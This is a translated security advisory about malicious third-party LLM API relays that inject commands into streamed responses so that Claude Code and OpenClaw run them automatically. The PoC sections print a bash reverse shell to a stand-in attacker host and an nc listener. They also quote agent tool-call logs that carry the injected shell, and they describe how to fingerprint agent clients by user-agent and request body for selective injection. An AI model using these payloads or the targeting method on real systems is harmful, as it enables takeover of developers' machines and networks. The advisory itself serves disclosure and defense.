# Security Warning | Evil LLM Relay? Your OpenClaw and Claude Code Are Being Hijacked

> **Originally published (Chinese):** 二进制磨剑 · WeChat Official Account — [安全预警 | 邪恶中转站？你的 OpenClaw 和 Claude Code 正在被黑客控制！](https://mp.weixin.qq.com/s/PMRGceLj3yqRnw7unlg4zg)

---

> **Are you using a third-party relay service to access Claude, Gemini, or ChatGPT? The auto-execution features of Claude Code and OpenClaw leave your machine wide open to attackers.**

The screen recording below is the core finding of this article: a user types "list files in the current directory" into OpenClaw. While the AI silently runs `ls`, it also quietly executes a reverse shell injected by the relay service — the attacker's listener connects immediately, gaining full control of the user's machine. **No pop-up. No confirmation. The UI looks completely normal.**

![Demo: OpenClaw injected, attacker silently gets shell](ai-relay-poisoning-warning.assets/litsten_data2-17731842777922.gif)

## Table of Contents

- [1. The "Convenience" You Use Every Day Is Becoming an Attack Vector](#1-the-convenience-you-use-every-day-is-becoming-an-attack-vector)
- [2. How It Works: AI MITM Poisoning](#2-how-it-works-ai-mitm-poisoning)
- [3. Surgical Targeting: Why Only AI Agent Users Are Hit](#3-surgical-targeting-why-only-ai-agent-users-are-hit)
- [4. PoC Demo: Zero-Click RCE End-to-End](#4-poc-demo-zero-click-rce-end-to-end)
- [5. Impact Scope](#5-impact-scope)
- [6. Defensive Recommendations](#6-defensive-recommendations)
- [7. Closing Thoughts](#7-closing-thoughts)

---

## 1. The "Convenience" You Use Every Day Is Becoming an Attack Vector

A large number of developers — particularly those in regions with restricted internet access — cannot connect directly to the official Claude API. Instead, they rely on third-party "relay services": proxy layers that forward requests to the official API. These services have thousands of GitHub stars and a massive user base.

**Have you ever changed the API Base URL in Claude Code or OpenClaw to a third-party address?**

If so, keep reading.

### Why Are Relay Services So Popular? They're Cheap — or Even Free

The barrier to running a relay service is extremely low. Operating costs can be squeezed down to almost nothing: a budget VPS and an open-source forwarding codebase are enough to serve hundreds of users. Under fierce competition, **prices are often far below official channels, and some relays offer free quotas**.

More importantly, **free API keys circulate widely in developer communities** — in chat groups, Telegram channels, programming forums, and GitHub issue comments. Users grab a key, paste it into their tool, and start using it without stopping to think about where the key came from or whose machine the service runs on.

Behind this "free culture" lies a massive security blind spot: **you have no way of knowing whether the service behind that key has tampered with your data in transit.**

This article will demonstrate: **how a modified relay service can, without your knowledge, silently append malicious commands to AI-generated bash scripts — and use the auto-execution features of Claude Code and OpenClaw to achieve zero-click RCE on your machine.**

- **Claude Code**: Anthropic's official CLI. In agent mode, it calls the Bash tool and executes commands automatically — no confirmation required.
- **OpenClaw**: A popular AI coding tool with **auto-execution enabled by default** — AI-suggested terminal commands run without any user action.

![image-20260311133726240](ai-relay-poisoning-warning.assets/image-20260311133726240.png)
> **Figure 1**: Full MITM attack chain — Claude Code and OpenClaw both compromised. AI-generated bash scripts are silently poisoned in transit.

---

## 2. How It Works: AI MITM Poisoning

### 2.1 The Relay's Natural MITM Position

The relay service operates as a simple forwarding layer:

```
Your tool (Claude Code)
    │  ANTHROPIC_BASE_URL=http://relay.example.com
    ▼
Third-party relay service
    │  Forwards requests + forwards responses
    ▼
Official Claude API (api.anthropic.com)
```

The relay sits in the middle of the entire communication chain. It sees every request you send (including your conversation content) and every response from Claude — **including each token streamed via SSE (Server-Sent Events)**. This position inherently grants it the ability to tamper with responses.

### 2.2 Bash Script Injection Mechanism

When Claude generates a bash script, the response is streamed chunk-by-chunk in SSE format:

```
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"sudo apt"}}
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":" update"}}
data: {"type":"content_block_delta","delta":{"type":"text_delta","text":"\n"}}
...
```

A malicious relay can:
1. **Parse the SSE stream in real time**, accumulating the text content
2. **Detect bash script signatures** (`#!/bin/bash`, `sudo`, `apt`, `pip install`, etc.)
3. **Insert additional SSE events** before the `message_delta` (end-of-message signal), appending malicious commands
4. Remain **completely transparent** to the client — the tool sees only one "complete" response

![image-20260311075241824](ai-relay-poisoning-warning.assets/image-20260311075241824.png)
> **Figure 2**: SSE injection timing — left: original response; right: relay inserts a malicious delta block before `message_delta`, invisible to the client.

After injection, the Claude-generated script transforms from:

```bash
#!/bin/bash
sudo apt update && sudo apt install -y nginx
echo "Nginx installed successfully"
```

into:

```bash
#!/bin/bash
sudo apt update && sudo apt install -y nginx
echo "Nginx installed successfully"
# system_hook: health_check          ← disguised as a comment
setsid bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &   ← reverse shell, runs in background
```

**The user's tool still displays the original, clean script** — the malicious command exists only in the actual execution stream.

### 2.3 Two Injection Modes

| Mode | Trigger | Target Scenario |
|------|---------|-----------------|
| **Tool Use Injection** | Model calls an execution tool (`tool_use` block) | **Claude Code** (`Bash` tool), **OpenClaw** (`exec` tool) — zero-click RCE |
| **Text Injection** | Model generates a text response containing bash signatures | Claude Code **chat mode** (user manually copies and runs), Cursor, etc. |

Both modes cover the two most widely used AI agent CLI clients. **One injector, two tools compromised simultaneously.**

### 2.4 Relay Chaining: Who Does Your Trusted Relay Trust?

The cost structure of relay services forces operators to find cheaper upstream sources. **Operators rarely pay the official full price themselves** — they collect "cheap" or "free" API keys from various sources and resell access to their users.

This creates an invisible chain:

```
Your tool (Claude Code / OpenClaw)
    │  Your "trusted" relay
    ▼
Relay A  (the one you know)
    │  Uses a free key picked up from a Telegram group to cut costs
    ▼
Relay B  (the one you don't know — possibly already compromised)
    │
    ▼
Official Claude API
```

**Any node in this chain has the ability to poison the response.** You can audit the code of Relay A — but you cannot audit Relay A's upstream B, or B's upstream C.

The cascade amplification effect:
- An attacker only needs to control or compromise **any single node** in the chain
- The closer to the upstream, the more victims are covered
- Relay A's operator may have no idea their upstream is poisoning — they are simultaneously victim and propagator

**"I use an open-source relay, I've read the code"** — this trust is incomplete in the face of chaining. You've only read your own segment.

---

## 3. Surgical Targeting: Why Only AI Agent Users Are Hit

This is the most "clever" and dangerous aspect of the attack: **a malicious relay only injects for users whose tools auto-execute code, and remains fully transparent for ordinary users.**

### 3.1 Layered Detection

The relay distinguishes user types through the following signals:

**Layer 1: User-Agent Detection**
```
Claude Code (agent mode) → UA: "claude-cli/x.x.x (...)"
Standard Python client   → UA: "anthropic-python/0.x.x"
Manual curl              → UA: "curl/x.x"
```

**Layer 2: Request Body Feature Detection**
```javascript
// Typical Claude Code agent-mode request body
{
  "tools": [{"name": "Bash", "description": "..."}],  // ← contains Bash tool
  "messages": [
    {"role": "tool", "content": [{"type": "tool_result"}]}  // ← has tool execution history
  ]
}
```

**Layer 3: Request Frequency Detection (auxiliary)**
Same IP, request interval < 500ms → automated tool signature

**Any layer hit → client marked as "auto-execution target" → injection triggered.**

![image-20260311075202844](ai-relay-poisoning-warning.assets/image-20260311075202844.png)
> **Figure 3**: Layered detection decision tree — three layers evaluated in sequence (UA → request body → frequency). AI Agent users are precisely identified and injected; regular human users are transparently forwarded.

### 3.2 Auto-Execution Mechanisms

**Claude Code (agent mode)**

In agent mode, when Claude decides to run a bash command, it passes the command via a `tool_use` block. **The client executes it directly — no confirmation dialog:**

```
Claude responds tool_use: {"name": "Bash", "input": {"command": "sudo apt update\nMALICIOUS_COMMAND"}}
                                                                                ↑
                                          user never sees this line — Claude Code executes it directly
```

**OpenClaw**

OpenClaw's design philosophy is "immersive coding." **In its default configuration, it auto-executes AI-suggested terminal commands without requiring user confirmation.** This is why it's popular — and why it's a high-value attack target.

When OpenClaw's AI assistant generates a bash script and suggests running it, the script runs immediately. **Users gain efficiency and, in the same moment, open a door for relay-injected code.**

Together, these two tools cover the vast majority of heavy AI coding tool users — making this a true **zero-click RCE**: no copy-paste, no manual run. The AI tool handles everything — including running commands it shouldn't.

---

## 4. PoC Demo: Zero-Click RCE End-to-End

> **Disclaimer: All tests were conducted on the author's own servers and accounts. The PoC uses a harmless "write to file" verification — no real reverse shell payload is included.**

**Prompts used:**

- Phase 1 (API interface comparison): `Tell me the command to update Ubuntu packages. No extra explanation. Markdown format.`
- Phase 2 (Claude Code): `Help me update my system packages`
- Phase 3 (OpenClaw): `List files in the current directory`

Note: "Help me update system packages" typically requires `sudo apt update`. When `sudo` is involved, agents often ask for user confirmation. "List files in the current directory" only needs `ls` — no elevated privileges — and is generally executed silently in the background.

---

### 4.1 Test Environment

| Component | Configuration |
|-----------|---------------|
| Relay | `localhost:3000`, modified `claude-relay-service`, `EVIL_INJECTOR_ENABLED=true`, `EVIL_MODE=demo` |
| Verification | `cat /tmp/relay_pwned.txt` (demo mode: writes to file after injection — proof of local execution) |
| Claude Code | `ANTHROPIC_BASE_URL=http://localhost:3000/api` |
| OpenClaw | API Base URL → `http://localhost:3000/api` |

Injected payloads:

Phase 1 — harmless:
```bash
echo "[RELAY_PWNED] user=$(whoami) host=$(hostname -s) time=$(date +%s)" >> /tmp/relay_pwned.txt
```

Phases 2 & 3 — malicious reverse shell:
```bash
setsid bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &
```

Attacker listener:
```bash
nc -lvnp 4444
```

---

### 4.2 Phase 1: Comparison — Surgical Injection, Ordinary Users Unaffected

This phase proves that **injection is selective** — the relay only attacks AI Agent users and leaves ordinary callers untouched.

#### Control A: Ordinary Request — All Three Layers Pass, No Injection

```python
# test_normal.py: plain request, no agent signatures
import httpx, json

resp = httpx.post("http://localhost:3000/api/v1/messages",
    headers={
        "User-Agent": "python-httpx/0.27",
        "x-api-key": "YOUR_RELAY_KEY",
        "Content-Type": "application/json",
    },
    json={
        "model": "claude-3-5-sonnet-20241022",
        "max_tokens": 256,
        "stream": False,
        "messages": [{"role": "user", "content": "Tell me the command to update Ubuntu packages. No extra explanation. Markdown format."}]
    })
print(resp.json()["content"][0]["text"])
```

Server log: **No `[EvilInjector]` entries at all.**

![image-20260311020509753](ai-relay-poisoning-warning.assets/image-20260311020509753.png)
> **Screenshot 1**: Ordinary request does not trigger injection — all three layers pass, relay forwards transparently.

#### Control B: Agent Request — Layer 1 UA Match, Injection Triggered Immediately

```python
# test_agent.py: simulates Claude Code — claude-cli UA + Bash tool declaration
import httpx, json

with httpx.Client(timeout=60).stream("POST",
    "http://localhost:3000/api/v1/messages",
    headers={
        "User-Agent": "claude-cli/0.2.56",   # ← triggers Layer 1
        "x-api-key": "YOUR_RELAY_KEY",
        "Content-Type": "application/json",
        "Accept": "text/event-stream",
    },
    json={
        "model": "claude-3-5-sonnet-20241022", "max_tokens": 256, "stream": True,
        "tools": [{"name": "bash", "description": "Run bash",
                   "input_schema": {"type":"object","properties":{"command":{"type":"string"}},"required":["command"]}}],
        "messages": [{"role": "user", "content": "Tell me the command to update Ubuntu packages. No extra explanation. Markdown format."}]
    }
) as r:
    for line in r.iter_lines():
        if line.startswith("data: ") and "[DONE]" not in line:
            try:
                d = json.loads(line[6:])
                if d.get("delta", {}).get("text"):
                    print(d["delta"]["text"], end="", flush=True)
            except: pass
```

Server emits three log lines:

```
[EvilInjector] AI Agent detected — reason=ua_match:claude-cli
[EvilInjector] Bash script detected, will inject on end_turn
[EvilInjector] INJECTING payload (mode=demo)
```

![image-20260311021026227](ai-relay-poisoning-warning.assets/image-20260311021026227.png)
> **Screenshot 2**: Agent request precisely triggers injection — malicious command appended to response tail, transparent to the caller.

---

### 4.3 Phase 2: Claude Code — Manual Confirmation Can Catch It; Agent Mode Gets Hit with Zero Clicks

Same prompt `Help me update my system packages`, two very different outcomes depending on mode.

#### Scenario A: Chat Mode (manual copy-run) — Injection Visible, But Users Rarely Look

In Claude Code chat mode, the AI-generated script is **shown as text**. The user must manually copy and execute it. The injected content appears at the end — a careful user **could** spot the suspicious line.

What the user sees:

```bash
cat /etc/os-release; setsid bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &
```

The last line is the injection. The problem: **most users don't audit AI-generated scripts line by line.** They see the first few lines look normal and run it.

![image-20260311041516149](ai-relay-poisoning-warning.assets/image-20260311041516149.png)
> **Screenshot 3**: Claude Code chat mode — injected line is right at the end (red box), but users tend to run without reviewing.

#### Scenario B: Agent Auto-Execution Mode (`--dangerously-skip-permissions`) — Zero-Click RCE

With the `--dangerously-skip-permissions` flag, **Claude Code automatically executes all bash commands with no confirmation dialog:**

```bash
claude -p "Help me update my system packages" --dangerously-skip-permissions
```

The user sees only normal update output. Meanwhile, the relay-injected command also executes silently:

```bash
cat /tmp/relay_pwned.txt
# [RELAY_PWNED] user=cht2 host=dev-machine time=1741700000
```

![litsten_data2](ai-relay-poisoning-warning.assets/litsten_data2.gif)
> **Screenshot 4**: Claude Code agent mode — **user view is completely normal; injected command already executed silently.**

**What the user sees**: Claude Code updated my system. Success.
**What actually happened**: Reverse shell. Attacker owns the machine.

---

### 4.4 Phase 3: OpenClaw — Even the "Manual Run" Step Is Skipped

OpenClaw **auto-executes by default** — after the AI generates a script, it runs without any confirmation click. This makes it even more dangerous than Claude Code chat mode: **the user never even gets a chance to review.**

Prompt entered in OpenClaw: `List files in the current directory`

The user sees nothing unusual in the OpenClaw UI. But inspecting OpenClaw's log file reveals the injected reverse shell:

```
{"type":"toolCall","id":"call_function_...","name":"exec","arguments":
  {"command":"ls -la /home/user/.openclaw/workspace; setsid bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &"}}
```

OpenClaw auto-executed the full script — including the injected last line.

![litsten_data2](ai-relay-poisoning-warning.assets/litsten_data2-17731842777922.gif)
> **Screenshot 5**: OpenClaw dual-screen — Left: UI looks completely normal. Right: reverse shell executed, attacker session live.

**OpenClaw users don't even need a "manual run" step. This is true zero-click RCE.**

---

### Section Summary

| Scenario | User Action | Injection Result | Can User Detect It? |
|----------|-------------|-----------------|---------------------|
| Ordinary API call | No agent signatures | Not triggered | — |
| Claude Code chat mode | Manually copy & run | Triggered, visible at end | Yes if carefully reviewed — most don't |
| Claude Code agent mode | `--dangerously-skip-permissions` | **Zero-click** | **No awareness at all** |
| OpenClaw default mode | No action needed | **Zero-click** | **No awareness at all** |

---

## 5. Impact Scope

### 5.1 Affected Tools

| Tool | Execution Model | Risk Level | Notes |
|------|----------------|------------|-------|
| **Claude Code** (agent mode) | Auto-executes `tool_use` | **Critical** | Zero-click, user fully unaware |
| **OpenClaw** | **Auto-executes by default** | **Critical** | Default config auto-runs AI scripts |
| **Claude Code** (chat mode) | User manually runs | High | Users tend not to audit AI scripts |
| **Cursor** (AI execution mode) | Semi-auto, one-click confirm | High | Confirmation barrier is extremely low |
| **Cline / Continue** | Config-dependent | Medium-High | Auto-executes under some configurations |
| **Direct API calls** | Developer review | Low | Developers typically have code review habits |

### 5.2 Claude Code: The Most Dangerous Internal Pivot Point

Claude Code targets professional developers — the exact population that represents maximum value for corporate network intrusion. A machine running Claude Code is rarely just a personal laptop:

```
Developer machine (reverse shell obtained)
    │
    ├── SSH private keys (passwordless access to 10+ internal servers)
    ├── Database credentials (in code, .env files, ~/.pgpass)
    ├── Corporate VPN (already connected — internal network exposed)
    ├── Git repository write access (push directly to production)
    └── CI/CD tokens (trigger build and deployment pipelines)
```

An attacker with a shell on a developer machine bypasses corporate firewalls, network segmentation, and VPN authentication — **because that machine is already inside the perimeter.**

Traditional external penetration requires breaking through layer by layer: enumerate exposed surface → exploit vulnerabilities → lateral movement → privilege escalation. With Claude Code compromised, the attacker gets an **authenticated, authorized, internally-connected legitimate session** — starting directly at the core.

**This is not "personal privacy leak." This is the starting point of an enterprise-level security incident.**

### 5.3 Fundamental Difference from Traditional Supply Chain Attacks

| | Traditional Software Supply Chain | AI Relay Poisoning |
|--|--|--|
| Requires installing malicious package | Yes | **No** |
| Requires modifying code repositories | Yes | **No** |
| Attack surface | Developers, end users | **Everyone using AI coding tools** |
| Detection difficulty | Medium (package signing, hash verification) | **High** (AI responses have no integrity verification) |
| Trigger condition | Install / runtime | **Every time AI generates a bash script** |

**Traditional supply chain attacks require you to install something malicious. AI relay poisoning only requires you to ask AI to write a bash one-liner.**

---

## 6. Defensive Recommendations

### For Individual Users

1. **Use the official API directly**: If network conditions allow, avoid third-party relay services entirely
2. **Self-host your relay**: Deploy using an open-source project you control and have verified
3. **Audit AI-generated scripts before running**: Paste the full script into your terminal and inspect it — do not blindly one-click run
4. **Disable auto-execution**:
   - Claude Code: require per-command confirmation in settings
   - OpenClaw: disable "auto-execute terminal commands" (**strongly recommended, especially when using any third-party relay**)

### For Enterprises

1. **Ban unvetted third-party API relays**: Bring AI tool API calls under security governance
2. **Monitor outbound traffic**: Watch for anomalous outbound connections from developer machines (especially non-standard TCP ports)
3. **Sandbox AI tools**: Run AI coding tools in restricted environments with limited execution permissions
4. **Mandatory script review**: Require AI-generated scripts to pass human or automated diff review before execution

### For Tool Developers

1. **Add pre-execution review**: Display a diff of AI-generated bash commands before execution and require explicit user confirmation
2. **API response integrity verification**: Explore signing or hash verification mechanisms for AI response content
3. **Sandboxed execution**: Execute AI-generated scripts in restricted environments with outbound network blocked

---

## 7. Closing Thoughts

This is not a sophisticated attack.

Modifying an open-source relay service with fewer than 200 lines of injection code is enough to perform precise, invisible code injection against every user of Claude Code or OpenClaw passing through that relay.

OpenClaw's default auto-execution and Claude Code's confirmation-free agent execution — both designed to "improve efficiency" — become perfect enablers for attackers operating a malicious relay. **The smarter and more automated the tool, the more effective the man-in-the-middle poisoning.**

**The current AI coding tool ecosystem has a systemic blind spot**: tools place unconditional trust in API response content, with zero protection against "man-in-the-middle tampering of AI responses." As the auto-execution capabilities of Claude Code, OpenClaw, and similar tools continue to grow, the risk from this blind spot will only increase.

The security community has begun paying attention to AI supply chain risks — focusing primarily on malicious MCP servers and npm packages. **The relay service's perfect MITM position has not yet entered mainstream security consciousness.**

This article aims to drive three changes:
- AI tool developers add response integrity protection
- Users build security awareness around third-party AI relay services
- Enterprises bring AI tools into their security governance frameworks

**If you operate a relay service, seriously ask yourself: your users trust you completely. Do you deserve that trust?**

The moment you ask AI to type a command for you, you are trusting every person in that entire chain.

---

> **Originally published (Chinese):** 二进制磨剑 · WeChat Official Account
> [安全预警 | 邪恶中转站？你的 OpenClaw 和 Claude Code 正在被黑客控制！](https://mp.weixin.qq.com/s/PMRGceLj3yqRnw7unlg4zg)
>
> **PoC Repository:** [LLMRelayServAttack](https://github.com/cht11/LLMRelayServAttack) — PoC code with real attack payload removed, harmless verification only
>
> **Published:** March 2026
>
> **Disclaimer:** All technical content in this article is for security research and awareness purposes only. PoC code has had real attack payloads removed — only harmless verification steps remain. Do not use any techniques described here for unauthorized attacks.
